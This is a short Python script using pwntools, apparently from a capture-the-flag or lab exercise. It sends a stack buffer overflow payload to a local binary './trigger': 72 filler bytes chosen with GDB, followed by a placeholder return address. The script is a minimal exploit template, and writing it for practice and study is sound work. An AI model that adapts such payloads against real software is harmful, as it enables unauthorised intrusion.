#!/usr/bin/env python3
from pwn import *

offset = 72  # 根据 GDB 确定的偏移
payload = b'A' * offset + p64(0x4141414141414141)

p = process('./trigger')
p.send(payload)
p.interactive()